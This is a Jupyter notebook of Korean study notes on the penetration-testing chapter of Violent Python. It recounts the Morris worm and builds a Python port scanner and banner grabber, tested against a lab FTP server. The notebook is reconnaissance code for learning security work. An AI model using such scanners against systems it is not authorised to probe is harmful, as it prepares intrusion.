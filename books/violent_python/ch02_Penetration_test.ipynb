{
 "metadata": {
  "name": "",
  "signature": "sha256:80c1194aff970fb368b69030d117609a2a4c88c81a25fec2248a96d847263848"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "\n",
      "# 2. \uce68\ud22c \ud14c\uc2a4\ud2b8\n",
      "\n",
      "### \uc774 \uc7a5\uc5d0\uc11c \ub2e4\ub8e8\ub294 \ub0b4\uc6a9\n",
      "\n",
      "- \ud3ec\ud2b8 \uc2a4\uce90\ub108 \ub9cc\ub4e4\uae30\n",
      "- SSH \ubd07\ub137 \uad6c\ucd95\ud558\uae30\n",
      "- FTP\ub85c \ub300\ub7c9 \uacf5\uaca9\ud558\uae30\n",
      "- \ucee8\ud53c\ucee4 \uc81c\uc791\ud558\uae30\n",
      "- \uc9c1\uc811 \uc81c\ub85c \ub370\uc774 \uacf5\uaca9 \ub9cc\ub4e4\uae30\n",
      "\n",
      "\n",
      "## \uc18c\uac1c: \ubaa8\ub9ac\uc2a4 \uc6dc - \uc624\ub298\ub0a0\uc5d0\ub3c4 \uc720\ud6a8\ud560\uae4c?\n",
      "\n",
      "- \ub85c\ubc84\ud2b8 \ud0c0\ud39c \ubaa8\ub9ac\uc2a4\ub294 \ubbf8\uad6d\uc758 NSA\uc758 \ucef4\ud4e8\ud130 \ubcf4\uc548 \uc13c\ud130\uc7a5\uc758 \uc544\ub4e4\ub85c\uc368 \uc77c\uba85 Morris Worm \uc774\ub77c \ubd88\ub9ac\ub294 \uc6dc\uc73c\ub85c \uc57d 6\ucc9c\ub300\uc758 \ucef4\ud4e8\ud130\ub97c \uac10\uc5fc\uc2dc\ud0b4\n",
      "- 1988\ub144\uc5d0\ub294 \uc778\ud130\ub137\uc5d0 \uc5f0\uacb0\ub418\uc5b4 \uc788\ub358 \ubaa8\ub4e0 \ucef4\ud4e8\ud130\uc758 10%\uc5d0 \ud574\ub2f9\ud558\ub294 \uc22b\uc790\n",
      "- \uc57d 100\uc5b5\uc6d0\uc5d0\uc11c 1000\uc5b5\uc6d0 \uac00\ub7c9\uc774 \uc18c\uc694\ub428\n",
      "\n",
      "### \ubaa8\ub9ac\uc2a4 \uc6dc\uc758 \uc791\ub3d9 \uc6d0\ub9ac\n",
      "\n",
      "1. \uc720\ub2c9\uc2a4\uc758 sendmail \ud504\ub85c\uadf8\ub7a8\uc5d0 \uc788\ub294 \ucde8\uc57d\uc810 \ud65c\uc6a9\n",
      "2. \uc720\ub2c9\uc2a4 \uc2dc\uc2a4\ud15c\uc5d0\uc11c \uc0ac\uc6a9\ud558\uace0 \uc788\ub294 finger \ub370\ubaac\uc5d0 \uc788\ub294 \ucde8\uc57d\uc810\n",
      "3. \ud754\ud788 \uc0ac\uc6a9\ud558\ub294 \uc0ac\uc6a9\uc790\uc774\ub984\uacfc \ud328\uc2a4\uc6cc\ub4dc\uc758 \ubaa9\ub85d\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc6d0\uaca9 \uc258(RSH)\ub85c \uacf5\uaca9\ub300\uc0c1\uc5d0 \uc5f0\uacb0\ud558\ub824\uace0 \uc2dc\ub3c4\n",
      "\n",
      "\n",
      "- \uc774 3\uac00\uc9c0 \uc911\uc5d0 \ub2e8 1\uac00\uc9c0\ub9cc \uc131\uacf5\uc744 \ud574\ub3c4 \uc6dc\uc740 \ud504\ub85c\uadf8\ub7a8\uc744 \uc0ac\uc6a9\ud558\uc5ec \ubc14\uc774\ub7ec\uc2a4\uc758 \ub098\uba38\uc9c0 \ubd80\ubd84\uc744 \uac00\uc838\uc62c \uc218 \uc788\uc5c8\ub2e4\n",
      "\n",
      "- \uc624\ub298\ub0a0\uc5d0\ub3c4 \uc774\uc640 \ube44\uc2b7\ud55c \uacf5\uaca9\uc774 \uac00\ub2a5\ud560\uae4c?\n",
      "- \ubaa8\ub9ac\uc2a4\ub294 \uc6dc\uc758 \ub300\ubd80\ubd84\uc744 C\uc5b8\uc5b4\ub85c \uc791\uc131\n",
      "- \ud30c\uc774\uc36c\uc73c\ub85c \ubaa8\ub9ac\uc2a4 \uc6dc\uc758 \uc77c\ubd80\ubd84\ub4e4\uc744 \uc7ac\ud604\ud558\uace0 \ud55c \uac1c\uc758 \uacf5\uaca9 \ubca1\ud130\uc5d0 \ub300\ud574\uc11c\ub3c4 \uad6c\ud604\ud574\ubcfc \uac83\n",
      "\n",
      "## \ud3ec\ud2b8 \uc2a4\uce90\ub108 \ub9cc\ub4e4\uae30\n",
      "\n",
      "- \uc815\ubcf4 \uc218\uc9d1\uc740 \ubaa8\ub4e0 \uc0ac\uc774\ubc84 \uacf5\uaca9\uc758 \uccab\ubc88\uc9f8 \ub2e8\uacc4\n",
      "\n",
      "### probe search enemy in Starcraft\n",
      "\n",
      "<img src=\"files/images/probe_search.jpg\" />\n",
      "\n",
      "- \uacf5\uaca9\uc790\ub294 \uacf5\uaca9\ub300\uc0c1\uc5d0 \uc5b4\ub5a4 \uacf5\uaca9\uc744 \ud560\uc9c0 \uacb0\uc815\ud558\uae30 \uc804\uc5d0 \uc5b4\ub514\uc5d0 \uc5b4\ub5a4 \ucde8\uc57d\uc810\uc774 \uc788\ub294\uc9c0 \uba3c\uc800 \ud655\uc778\n",
      "- \uc815\ubcf4\uc218\uc9d1 \uc2a4\ud06c\ub9bd\ud2b8\ub97c \ub9cc\ub4e4 \uac83\n",
      "- \uc5f4\ub824\uc788\ub294 TCP \ud3ec\ud2b8\ub97c \ucc3e\uae30 \uc704\ud574 \uacf5\uaca9\ub300\uc0c1\uc744 \uc2a4\uce94\ud560 \uac83\n",
      "- TCP \ud3ec\ud2b8\uc640 \ud1b5\uc2e0\ud558\uae30 \uc704\ud574\uc11c\ub294 \uba3c\uc800 TCP \uc18c\ucf13\uc744 \ub9cc\ub4e4\uc5b4\uc57c \ud568\n",
      "- BSD \uc18c\ucf13 \uc778\ud130\ud398\uc774\uc2a4\uc5d0 \uc811\uadfc\ud560 \uc218 \uc788\ub294 \uc218\ub2e8 \uc81c\uacf5\n",
      "- BSD \uc18c\ucf13\uc740 \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ud504\ub85c\uadf8\ub798\ubc0d \uc778\ud130\ud398\uc774\uc2a4 \uc81c\uacf5\ud558\uba70, \uc774\ub97c \ud1b5\ud574 \ud504\ub85c\uadf8\ub798\uba38\ub294 \ud638\uc2a4\ud2b8\uac04 \ub124\ud2b8\uc6cc\ud06c \ud1b5\uc2e0\uc744 \ud560 \uc218 \uc788\ub294 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \uc791\uc131 \uac00\ub2a5\ud558\uac8c \ub428\n",
      "- \uc5ec\ub7ec \uac1c\uc758 \uc18c\ucf13 API \ud568\uc218\ub97c \uc0ac\uc6a9\ud558\uc5ec TCP/IP \uc18c\ucf13\uc5d0\uc11c \ud2b8\ub798\ud53d\uc744 \uc0dd\uc131, \ubc14\uc778\ub529, \ub9ac\uc2a4\ub2dd \ub610\ub294 \uc804\uc1a1\uc744 \ud560 \uc218 \uc788\uc74c\n",
      "- \uc9c1\uc811 \uacf5\uaca9\uc744 \ub354 \ubc1c\uc804\uc2dc\ud0a4\uae30 \uc704\ud574\uc11c\ub294 TCP/IP\uc640 \uc18c\ucf13\uc5d0 \ub300\ud55c \ub354 \uae4a\uc740 \uc774\ud574\uac00 \ud544\uc694\ud568\n",
      "\n",
      "\n",
      "- \uc778\ud130\ub137\uc5d0 \uc811\uadfc\uc774 \uac00\ub2a5\ud55c \ub300\ubd80\ubd84\uc758 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc740 TCP \uc0ac\uc6a9\n",
      "- \uc6f9\uc11c\ubc84: TCP 80\n",
      "- \uba54\uc77c \uc11c\ubc84: TCP 25\n",
      "- \ud30c\uc77c \uc11c\ubc84: TCP 21\n",
      "- \uc774\ub7ec\ud55c \uc11c\ube44\uc2a4\ub4e4 \uc911 \uc5b4\ub290 \ud558\ub098\uc5d0 \uc5f0\uacb0\ud558\uae30 \uc704\ud574\uc11c \uace0\uc5ed\uc790\ub294 IP \uc8fc\uc18c\uc640 \ud574\ub2f9 \uc11c\ube44\uc2a4\uc5d0\uc11c \uc0ac\uc6a9\ud558\uace0 \uc788\ub294 TCP \ud3ec\ud2b8\ub97c \ubc18\ub4dc\uc2dc \uc54c\uc544\uc57c \ud568\n",
      "- \uacf5\uaca9\ub300\uc0c1 \uc5c5\uccb4\uc5d0 \ub300\ud574 \uc5b4\ub290 \uc815\ub3c4 \uc9c0\uc2dd\uc774 \uc788\ub2e4\uba74 \uc0c1\uad00\uc5c6\uc9c0\ub9cc \uacf5\uaca9\uc790\ub294 \ub300\ubd80\ubd84 \ubaa8\ub978\ub2e4.\n",
      "\n",
      "\n",
      "- \uacf5\uaca9\uc790\ub294 \uc131\uacf5\uc801\uc778 \uacf5\uaca9\uc744 \uc704\ud574 \uc8fc\uae30\uc801\uc73c\ub85c \ud3ec\ud2b8 \uc2a4\uce94 \uc2e4\uc2dc\n",
      "- TCP SYN\uc744 \ud3ec\ud2b8\uc5d0 \uc804\uc1a1\ud558\uc5ec TCP ACK \uc751\ub2f5\uc774 \uc62c \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9ac\ub294 \uac83. \ub9cc\uc57d ACK\ub97c \uc804\uc1a1 \ubc1b\uc73c\uba74 \ud574\ub2f9 \ud3ec\ud2b8\ub294 \uc5f4\ub824\uc788\ub294 \uac83\n",
      "- \uadf8\uc5d0 \ubc18\ud574 TCP Connect Scan\uc740 three-way handshake\ub97c \uc0ac\uc6a9\ud558\uc5ec \ud2b9\uc815 \uc11c\ube44\uc2a4\ub098 \ud3ec\ud2b8\uac00 \uc5f4\ub824\uc788\ub294\uc9c0 \ud310\ub2e8\n",
      "\n",
      "------\n",
      "\n",
      "### NMAP scan\n",
      "\n",
      "<img src=\"files/images/comsat.jpg\" />\n",
      "\n",
      "- [TCP SYN Scan Operation](http://www.networkuptime.com/nmap/page3-2.shtml)\n",
      "- [Nmap\uc744 \uc774\uc6a9\ud55c \ub0b4 \ub124\ud2b8\uc6cc\ud06c \ucde8\uc57d\uc810\uc744 \ucc3e\uc544\ubcf4\uc790](http://support.oullim.co.kr/portal/Techletter/20080730/news4.htm)\n",
      "- [NMAP \uc0ac\uc6a9\ubc95 \\| \uc2a4\uce94 \uae30\uc220 1](http://blog.naver.com/PostView.nhn?blogId=sol9501&logNo=70102105233&categoryNo=34&viewDate=&currentPage=1&listtype=0)\n",
      "\n",
      "------\n",
      "\n",
      "### TCP \ud480 \ucee4\ub125\ud2b8 \uc2a4\uce94\n",
      "\n",
      "- \uba3c\uc800 BSD \uc18c\ucf13 API\ub97c \uc784\ud3ec\ud2b8\ud560 \uac83\n",
      "- \uc18c\ucf13 API\uc5d0\ub294 \ub098\uc911\uc5d0 TCP \ud3ec\ud2b8 \uc2a4\uce90\ub108\ub97c \uad6c\ud604\ud560 \ub54c \uc720\uc6a9\ud55c \uae30\ub2a5\ub4e4\uc774 \uc788\uc74c\n",
      "- [socket - Python Standard Library](http://docs.python.org/library/socket.html)\n",
      "- [socket - pymotw](http://pymotw.com/2/socket/index.html)\n",
      "\n",
      "\n",
      "- \uc5b4\ub5bb\uac8c \uc791\ub3d9\ud558\ub294\uc9c0 \uc880 **\ub354 \uc798 \uc774\ud574**\ud558\uae30 \uc704\ud574 \uc2a4\ud06c\ub9bd\ud2b8\ub97c **\ub2e4\uc12f \ub2e8\uacc4**\ub85c \ub098\ub20c \uac83\n",
      "\n",
      "1. \uba3c\uc800 \ud638\uc2a4\ud2b8 \uc774\ub984\uacfc \uc2a4\uce90\ub2dd\ud560 \ud3ec\ud2b8\uc758 \ubaa9\ub85d\uc744 \uc785\ub825\ud560 \uac83\n",
      "2. \ud638\uc2a4\ud2b8 \uc774\ub984\uc744 IPv4 \uc778\ud130\ub137 \uc8fc\uc18c\ub85c \ubcc0\ud658\ud560 \uac83\n",
      "3. \ubaa9\ub85d\uc5d0 \uc788\ub294 \uac01 \ud3ec\ud2b8\ub9c8\ub2e4 \uc5f0\uacb0\uc744 \uc2dc\ub3c4\ud560 \uac83\n",
      "4. \ud3ec\ud2b8\uc5d0\uc11c \uc2e4\ud589\ub418\uace0 \uc788\ub294 \uc11c\ube44\uc2a4\uac00 \ubb34\uc5c7\uc778\uc9c0 \ud310\ub2e8\ud558\uae30 \uc704\ud574 garbage \ub370\uc774\ud130\ub97c \uc804\uc1a1\ud558\uace0 \ud574\ub2f9 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 \uc804\uc1a1\ud558\ub294 \ubc30\ub108\uac12\uc744 \uc77d\uc744 \uac83\n",
      "\n",
      "\n",
      "- \uc0ac\uc6a9\uc790\ub85c\ubd80\ud130 \ud638\uc2a4\ud2b8 \uc774\ub984\uacfc \ud3ec\ud2b8\ub97c \uc785\ub825 \ubc1b\uc74c. \ucee4\ub9e8\ub4dc\ub77c\uc778\uc5d0\uc11c \uc635\uc158\uc744 \ucc98\ub9ac\ud558\uae30 \uc704\ud574 optparse\ub97c \uc0ac\uc6a9\ud560 \uac83.\n",
      "- OptionParser([usage message])\ub97c \ud638\ucd9c\ud558\uba74 \uc635\uc158 \uad6c\ubb38\ubd84\uc11d\uae30\uc758 \uc2e4\uccb4\ub97c \uc0dd\uc131\n",
      "- parser.add_option \uc2a4\ud06c\ub9bd\ud2b8\uc5d0\uc11c \uc0ac\uc6a9\ud560 \ucee4\ub9e8\ub4dc\ub77c\uc778 \uc635\uc158\uc744 \uc815\uc758\n",
      "- \uacf5\uaca9\ub300\uc0c1 \ud638\uc2a4\ud2b8 \uc774\ub984\uacfc \uc2a4\uce94\ud560 \ud3ec\ud2b8\ub97c \ucc98\ub9ac\ud558\ub294 \ucf54\ub4dc"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "from IPython.display import YouTubeVideo"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 45
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# import optparse\n",
      "# parser = optparse.OptionParser('usage %prog ' +\\\n",
      "#                                '-H <target host> -p <target port>')\n",
      "# parser.add_option('-H', dest='tgtHost', type='string', \\\n",
      "#                   help='specify target host')\n",
      "# parser.add_option('-p', dest='tgtPort', type='int', \\\n",
      "#                   help='specify target port')\n",
      "# (options, args) = parser.parse_args()\n",
      "# tgtHost = options.tgtHost\n",
      "# tgtPort = options.tgtPort\n",
      "# if (tgtHost == None) | (tgtPort == None):\n",
      "#     print parser.usage"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 1
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "<img src=\"files/images/quiz.png\" />\n",
      "\n",
      "#### Quiz\n",
      "\n",
      "- parser.add_option \uc758 \ub9c8\uc9c0\ub9c9\uc5d0 \\\\\uc758 \uc758\ubbf8\ub294?"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# !cat ch01/reverse_slash.txt"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 2
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \ub2e4\uc74c\uc73c\ub85c connScan\uc640 portScan 2\uac1c\uc758 \ud568\uc218\ub97c \ub9cc\ub4e6\n",
      "\n",
      "\n",
      "1. portScan: \ud638\uc2a4\ud2b8 \uc774\ub984\uacfc \ub300\uc0c1 \ud3ec\ud2b8\ub97c \uc785\ub825 \ubc1b\ub294\ub2e4\n",
      "  - \uba3c\uc800 gethostname() \ud568\uc218\ub97c \uc0ac\uc6a9\ud558\uc5ec IP \uc8fc\uc18c\ub97c \ubcf4\uae30 \ud3b8\ud55c \ud638\uc2a4\ud2b8 \uc774\ub984\uc73c\ub85c \ubcc0\ud658\ud558\ub824\uace0 \ud568\n",
      "  - \ud638\uc2a4\ud2b8 \uc774\ub984(\ub610\ub294 IP\uc8fc\uc18c)\ub97c \ucd9c\ub825\ud558\uace0 connScan \ud568\uc218\ub97c \uc0ac\uc6a9\ud558\uc5ec \uac01 \ud3ec\ud2b8\uc5d0 \uc5f0\uacb0\uc744 \uc2dc\ub3c4\n",
      "2. connScan \ud568\uc218\ub294 tgtHost\uc640 tgtPort \ub4f1 2\uac1c\uc758 \uc778\uc790\uac12\uc744 \uc785\ub825 \ubc1b\uc73c\uba74 \ub300\uc0c1 \ud638\uc2a4\ud2b8\uc640 \ud3ec\ud2b8\uc5d0 \uc5f0\uacb0\uc744 \uc0dd\uc131\ud558\ub824\uace0 \uc2dc\ub3c4\n",
      "  - \ub9cc\uc57d\uc5d0 \uc5f0\uacb0\uc5d0 \uc131\uacf5\ud558\uba74 connScan\ub294 \ud3ec\ud2b8\uac00 \uc5f4\ub824\uc788\ub2e4\ub294 \uba54\uc2dc\uc9c0\ub97c \ud654\uba74\uc5d0 \ucd9c\ub825\n",
      "  - \ub9cc\uc57d \uc2e4\ud328\ud558\uba74 \ud3ec\ud2b8\uac00 \ub2eb\ud600\uc788\ub2e4\ub294 \uba54\uc2dc\uc9c0\ub97c \ud654\uba74\uc5d0 \ucd9c\ub825"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import optparse\n",
      "from socket import *\n",
      "\n",
      "# targetHost, targetPort\n",
      "def connScan(tgtHost, tgtPort):\n",
      "    try:\n",
      "        # connect Socket\n",
      "        connSkt = socket(AF_INET, SOCK_STREAM)\n",
      "        connSkt.connect((tgtHost, tgtPort))\n",
      "        connSkt.close()\n",
      "    except:\n",
      "        print '[-]%d/tcp closed' % tgtPort\n",
      "        \n",
      "# \ud2b9\uc815 \ud638\uc2a4\ud2b8, \ud3ec\ud2b8\ub4e4\n",
      "def portScan(tgtHost, tgtPorts):\n",
      "    try:\n",
      "        # 69.163.177.2 = gethostbyname('www.syngress.com')\n",
      "        tgtIP = gethostbyname(tgtHost)\n",
      "    except:\n",
      "        print \"[-] Cannot resolve '%s': Unknown host\" % tgtHost\n",
      "        return\n",
      "    \n",
      "    try:\n",
      "        tgtName = gethostbyaddr(tgtIP)\n",
      "        print '\\n[+] Scan Results for: ' + tgtName[0]\n",
      "    except:\n",
      "        print '\\n[+] Scan Results for: ' + tgtIP\n",
      "    \n",
      "    setdefaulttimeout(1)\n",
      "    \n",
      "    for tgtPort in tgtPorts:\n",
      "        print 'Scanning port ' + tgtPort\n",
      "        connScan(tgtHost, int(tgtPort))"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 3
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### gethostbyname, dig \ud65c\uc6a9\ud558\uc5ec \ub9de\ub294\uc9c0 \ud655\uc778\ud558\uae30"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "from socket import *\n",
      "host_name = 'www.syngress.com'"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 92
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "tgtIP = gethostbyname(host_name)\n",
      "tgtIP"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 93,
       "text": [
        "'79.170.91.51'"
       ]
      }
     ],
     "prompt_number": 93
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "tgtName = gethostbyaddr(tgtIP)\n",
      "tgtName"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 95,
       "text": [
        "('scitechconnect.elsevier.com',\n",
        " ['51.91.170.79.in-addr.arpa'],\n",
        " ['79.170.91.51'])"
       ]
      }
     ],
     "prompt_number": 95
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "print tgtName[0]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "scitechconnect.elsevier.com\n"
       ]
      }
     ],
     "prompt_number": 96
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# ipython notebook\uc5d0\uc11c \uc124\uc815\ud55c \ubcc0\uc218\ub97c shell\uc5d0\uc11c\ub3c4 \uc0ac\uc6a9 \uac00\ub2a5! unbelievable!!\n",
      "# dig: dig (domain information groper) is a network administration \n",
      "# command-line tool for querying Domain Name System (DNS) name servers.\n",
      "!dig $host_name"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "; <<>> DiG 9.8.5-P1 <<>> www.syngress.com\r\n",
        ";; global options: +cmd\r\n",
        ";; Got answer:\r\n",
        ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40597\r\n",
        ";; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 3, ADDITIONAL: 5\r\n",
        "\r\n",
        ";; QUESTION SECTION:\r\n",
        ";www.syngress.com.\t\tIN\tA\r\n",
        "\r\n",
        ";; ANSWER SECTION:\r\n",
        "www.syngress.com.\t300\tIN\tA\t79.170.91.51\r\n",
        "\r\n",
        ";; AUTHORITY SECTION:\r\n",
        "syngress.com.\t\t63796\tIN\tNS\tns.elsevier.co.uk.\r\n",
        "syngress.com.\t\t63796\tIN\tNS\tns1-s.dns.pipex.net.\r\n",
        "syngress.com.\t\t63796\tIN\tNS\tns0-s.dns.pipex.net.\r\n",
        "\r\n",
        ";; ADDITIONAL SECTION:\r\n",
        "ns.elsevier.co.uk.\t49057\tIN\tA\t193.131.222.35\r\n",
        "ns0-s.dns.pipex.net.\t69929\tIN\tA\t158.43.129.83\r\n",
        "ns0-s.dns.pipex.net.\t69929\tIN\tAAAA\t2001:600:1c0:e000::35:2a\r\n",
        "ns1-s.dns.pipex.net.\t69929\tIN\tA\t158.43.193.83\r\n",
        "ns1-s.dns.pipex.net.\t69929\tIN\tAAAA\t2001:600:1c0:e001::35:2a\r\n",
        "\r\n",
        ";; Query time: 297 msec\r\n",
        ";; SERVER: 203.248.252.2#53(203.248.252.2)\r\n",
        ";; WHEN: Sun Jun 29 04:34:44 KST 2014\r\n",
        ";; MSG SIZE  rcvd: 238\r\n",
        "\r\n"
       ]
      }
     ],
     "prompt_number": 97
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ubc30\ub108 \uac00\uc838\uc624\uae30\n",
      "\n",
      "- \uacf5\uaca9\ub300\uc0c1 \ud638\uc2a4\ud2b8\ub85c\ubd80\ud130 \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ubc30\ub108\ub97c \uac00\uc838\uc624\uae30 \uc704\ud574\uc11c\ub294 \uba3c\uc800 connScan \ud568\uc218\uc758 \ucf54\ub4dc\ub97c \ucd94\uac00\ud574\uc57c \ud568\n",
      "- \uc5f4\ub824\uc788\ub294 \ud3ec\ud2b8\ub97c \ubc1c\uacac\ud55c \ud6c4\uc5d0 \ub370\uc774\ud130\ub97c \ud3ec\ud2b8\ub85c \uc804\uc1a1\ud558\uace0, \uadf8\ub9ac\uace0 \uc751\ub2f5\uc744 \uae30\ub2e4\ub9bc\n",
      "- \uc774 \uc751\ub2f5\uc744 \uc218\uc9d1\ud558\uba74 \uacf5\uaca9\ub300\uc0c1\uacfc \uadf8 \ud3ec\ud2b8\uc5d0\uc11c \uc2e4\ud589\ud558\uace0 \uc788\ub294 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 \ubb34\uc5c7\uc778\uc9c0 \uc54c \uc218\ub3c4 \uc788\uac8c \ub428\n",
      "\n",
      "#### [optparse - Command line option parser to replace getopt.](http://pymotw.com/2/optparse/)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%writefile ch02/get_banner.py\n",
      "#-*- coding: utf-8 -*-\n",
      "import sys\n",
      "reload(sys)\n",
      "sys.setdefaultencoding('utf-8')\n",
      "\n",
      "import optparse\n",
      "import socket\n",
      "from socket import *\n",
      "\n",
      "# targetHost, targetPort\n",
      "def connScan(tgtHost, tgtPort):\n",
      "    try:\n",
      "        # connect Socket\n",
      "        connSkt = socket(AF_INET, SOCK_STREAM)\n",
      "        connSkt.connect((tgtHost, tgtPort))\n",
      "        connSkt.send('e ri python\\r\\n')\n",
      "        results = connSkt.recv(100)\n",
      "        print '[+] %d/tcp open' % tgtPort\n",
      "        print '[+] ' + str(results)\n",
      "        connSkt.close()\n",
      "    except:\n",
      "        print '[-] %d/tcp closed' % tgtPort\n",
      "        \n",
      "# portScan(\ud2b9\uc815 \ud638\uc2a4\ud2b8, \ud3ec\ud2b8\ub4e4)\n",
      "def portScan(tgtHost, tgtPorts):\n",
      "    try:\n",
      "        # 69.163.177.2 = gethostbyname('www.syngress')\n",
      "        tgtIP = gethostbyname(tgtHost)\n",
      "    except:\n",
      "        print \"[-] Cannot resolve '%s': Unknown host\" % tgtHost\n",
      "        return\n",
      "    \n",
      "    try:\n",
      "        tgtName = gethostbyaddr(tgtIP)\n",
      "        print '\\n[+] Scan Results for: ' + tgtName[0]\n",
      "    except:\n",
      "        print '\\n[+] Scan Results for: ' + tgtIP + ' except'\n",
      "    \n",
      "    setdefaulttimeout(1)\n",
      "    \n",
      "    for tgtPort in tgtPorts:\n",
      "        print 'Scanning port ' + tgtPort\n",
      "        # int method eliminates spaces\n",
      "        connScan(tgtHost, int(tgtPort))\n",
      "        \n",
      "def main():\n",
      "    parser = optparse.OptionParser('usage %prog ' +\n",
      "                               '-H <target host> ' +\n",
      "                               '-p <target port>')\n",
      "    parser.add_option('-H', \n",
      "                      dest='tgtHost', \n",
      "                      type='string',\n",
      "                      help='specify target host')\n",
      "    parser.add_option('-p', \n",
      "                      dest='tgtPort', \n",
      "                      type='string',\n",
      "                      help='specify target port[s] separated by comma')\n",
      "    \n",
      "    (options, args) = parser.parse_args()\n",
      "    \n",
      "    tgtHost = options.tgtHost\n",
      "    tgtPorts = options.tgtPort.split(',')\n",
      "    \n",
      "    # eliminates spaces clearly\n",
      "#     for idx, port in enumerate(tgtPorts):\n",
      "#         tgtPorts[idx] = port.strip()\n",
      "    \n",
      "    print tgtPorts\n",
      "    \n",
      "    if (tgtHost == None) | (tgtPorts[0] == None):\n",
      "        print '[-] You must specify a target host and port[s].'\n",
      "        print parser.usage\n",
      "#         exit(0)\n",
      "    \n",
      "    portScan(tgtHost, tgtPorts)\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    main()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Overwriting ch02/get_banner.py\n"
       ]
      }
     ],
     "prompt_number": 4
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# \ucc45\uc5d0\uc11c\ub294 -p 21, 22, 80\uc73c\ub85c \ub098\uc640 \uc788\ub294\ub370 ''\uc73c\ub85c \ubb36\uc5b4\uc11c string\uc73c\ub85c \uc778\uc2dd\ud558\uac8c \ud574\uc57c \ud55c\ub2e4.\n",
      "# \uc774\uac83 \ub54c\ubb38\uc5d0 10\ubd84 \uc0bd\uc9c8..\n",
      "# command line \uc0c1\uc5d0\uc11c ,\ub97c \uae30\uc900\uc73c\ub85c \uba85\ub839\uc5b4\uac00 \ub098\ub220\uc9c0\ub294\ub4ef.\n",
      "# \uc544\ub9c8 ''\ub85c \ubb36\uc9c0 \uc54a\uc544\ub3c4 \ub2e4\ub978 \ubc29\ubc95\uc774 \uc788\uc744\ub4ef\ud55c\ub370 \ucc3e\uc544\ubd10\uc57c\uaca0\ub2e4.\n",
      "!python ch02/get_banner.py -H 192.168.32.159 -p '21,22, 80'"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "['21', '22', ' 80']\r\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\r\n",
        "[+] Scan Results for: 172.16.190.128 except\r\n",
        "Scanning port 21\r\n",
        "[+] 21/tcp open\r\n",
        "[+] 220 FreeFloat Ftp Server (Version 1.00)\r",
        "\r\n",
        "\r\n",
        "Scanning port 22\r\n",
        "[-] 22/tcp closed\r\n",
        "Scanning port  80\r\n",
        "[-] 80/tcp closed\r\n"
       ]
      }
     ],
     "prompt_number": 5
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# int\ub97c \uc0ac\uc6a9\ud558\uba74 \uc790\ub3d9\uc73c\ub85c \uacf5\ubc31\uc774 \uc0ac\ub77c\uc9c0\uac8c \ub418\uc9c0\ub9cc \uba85\ud655\ud788 strip()\uc744 \uc0ac\uc6a9\ud558\ub294\uac8c \uc88b\uc74c\n",
      "print int(' 21  ')\n",
      "print int(' 21  '.strip())"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "21\n",
        "21\n"
       ]
      }
     ],
     "prompt_number": 6
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!python ch02/get_banner.py --help"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Usage: usage get_banner.py -H <target host> -p <target port>\r\n",
        "\r\n",
        "Options:\r\n",
        "  -h, --help  show this help message and exit\r\n",
        "  -H TGTHOST  specify target host\r\n",
        "  -p TGTPORT  specify target port[s] separated by comma\r\n"
       ]
      }
     ],
     "prompt_number": 7
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
